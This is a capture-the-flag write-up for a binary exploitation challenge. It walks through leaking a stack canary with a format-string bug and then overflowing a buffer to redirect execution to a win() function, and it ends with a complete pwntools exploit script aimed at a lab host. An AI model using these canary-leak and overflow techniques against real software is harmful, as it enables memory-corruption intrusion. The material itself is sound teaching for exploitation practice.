Canary Whisperer

Category: Binary Exploitation  |  Points: 350  |  Difficulty: Medium

Challenge Description

Stack canary is enabled. NX is enabled. No PIE.

The program reads input twice. The first input is printed back unsafely via printf(buf) — use it to leak the canary via a format string. The second input overflows a buffer — reuse the leaked canary to bypass the check and redirect RIP to win().

Exploit Walkthrough

01 Step 1 Identify the unsafe printf — format string vuln ▼
The first read() stores input in buf1[64]. The program then calls printf(buf1) with no format specifier.

Sending %p.%p.%p... leaks raw stack pointer values. The canary lives at a predictable stack offset from the format argument.
$ nc challenge.flagvault.local 9008
[*] What's your name? %11$p
[*] Hello, 0x3a88f4c2e1f20d00
    └─ ends in 00 → stack canary!
02 Step 2 Parse and validate the leaked canary value ▼
Stack canaries on x64 Linux always end in 0x00. This is the null-byte guard — it prevents string functions from leaking the canary accidentally.

Parse the hex output and verify the LSB is 0x00.
# Python — parse + validate
raw = r.recvline_contains(b'Hello').split()[-1]
canary = int(raw, 16)
assert canary & 0xff == 0, "Not a canary!"
log.success(f'canary = {hex(canary)}')
// LIVE CANARY VALIDATOR
03 Step 3 Build the overflow payload — canary + RIP ▼
The second buffer buf2[64] sits just below the canary on the stack. Overflow layout:

[64 bytes padding] + [8 bytes canary] + [8 bytes saved RBP] + [8 bytes RIP → win()]

No PIE → win() is at a fixed address. Find it: objdump -d ./canary_whisperer | grep win
# Python — craft payload
win_addr = 0x401196   # no PIE → fixed addr
payload = b'A' * 64   # fill buf2 to canary
payload += p64(canary) # canary intact → check passes
payload += p64(0)      # saved RBP (any value)
payload += p64(win_addr)# overwrite RIP
// PAYLOAD BUILDER
04 Step 4 Two-stage attack — leak → smash → win() ▼
Chain both stages in one pwntools script. Send the format string, receive the canary, immediately send the overflow payload with the canary at offset 64. The canary check passes → win() fires → flag.
# Chained two-stage
r.sendlineafter(b"name? ", b"%11$p")
raw = r.recvline_contains(b"Hello").split()[-1]
canary = int(raw, 16)
payload = b'A'*64 + p64(canary) + p64(0) + p64(0x401196)
r.sendlineafter(b"input? ", payload)
r.interactive()  # flag awaits!

Full Exploit Script

exploit.py — pwntools skeleton 
from pwn import *

HOST, PORT = 'challenge.flagvault.local', 9008
elf = ELF('./canary_whisperer')
r   = remote(HOST, PORT)

# stage 1 : leak canary via format string
r.sendlineafter(b"name? ", b"%11$p")
line   = r.recvline_contains(b"Hello")
raw    = line.split(b" ")[-1].strip()
canary = int(raw, 16)
assert canary & 0xff == 0, "Not a canary!"
log.success(f"canary = {hex(canary)}")

# stage 2 : overflow with canary intact
win_addr = elf.symbols['win']   # no PIE → static addr
payload  = flat(
    b'A' * 64,   # pad to canary
    canary,      # canary intact → check passes!
    0,          # saved RBP (clobber)
    win_addr     # overwrite RIP → win()
)
r.sendlineafter(b"input? ", payload)
r.interactive()
